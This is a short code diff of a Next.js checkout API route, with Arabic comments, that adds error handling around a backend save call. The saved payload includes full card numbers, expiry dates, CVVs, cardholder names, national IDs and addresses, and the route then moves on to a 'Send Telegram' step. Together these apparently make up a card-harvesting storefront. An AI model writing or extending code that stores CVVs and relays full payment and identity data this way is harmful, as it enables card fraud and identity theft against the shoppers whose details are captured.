@@ -8,12 +8,20 @@ export async function POST(req: NextRequest) {
 
   // حفظ في الداتابيز
   try {
-    await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
+    const dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
       method: "POST",
       headers: { "Content-Type": "application/json", "x-internal-secret": process.env.INTERNAL_SECRET ?? "" },
       body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
     });
-  } catch {}
+    if (!dbRes.ok) {
+      const errBody = await dbRes.text();
+      console.error("[notify] checkout save failed:", dbRes.status, errBody);
+      return NextResponse.json({ ok: false, error: errBody }, { status: dbRes.status });
+    }
+  } catch (e) {
+    console.error("[notify] checkout save error:", e);
+    return NextResponse.json({ ok: false, error: "تعذر حفظ الطلب" }, { status: 500 });
+  }
 
   // Send Telegram
   const ltr = "\u200E";
